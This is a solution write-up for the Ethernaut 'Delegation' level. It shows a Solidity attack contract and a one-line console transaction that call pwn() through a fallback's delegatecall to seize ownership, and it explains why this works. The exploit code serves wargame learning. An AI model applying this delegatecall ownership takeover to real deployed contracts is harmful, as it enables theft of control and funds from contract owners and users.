# Delegation

This contract can be hacked in two ways,either by the use of attack contract , or directly from the console .
### By Contract:
This way doesn't pass you the level but gets you the ownership of the contract.And that because the ownership is given to the contract not to you.
#### Code:
````// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    address public victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function exploit() public {
        victim.call(abi.encodeWithSignature("pwn()"));
    }
}
````
#### What happened:
By calling exploit function we are making a low level transaction calling the function `pwn()` But this function doesn't exist in the Delegation contract so the `fallback()` function will be called instead.
In the `fallback()` function a delegate call will be initiated to contract **Delegate** with `msg.data` which is a low level call to function `pwn()`.
The Delegate call execute the function `pwn()` inside the contract **Delegation** and so obtaining ownership.

### In Console:
This is the best way to solve this and the easiest, it is done from the console in Ethernaut and with one line of code.
#### Code:
````
sendTransaction({from: player, to: contract.address, data: web3.eth.abi.encodeFunctionSignature("pwn()")})
````

What happend is exactly the same using the contract the only difference is that `msg.sender` is the wallet address not the contracts one.
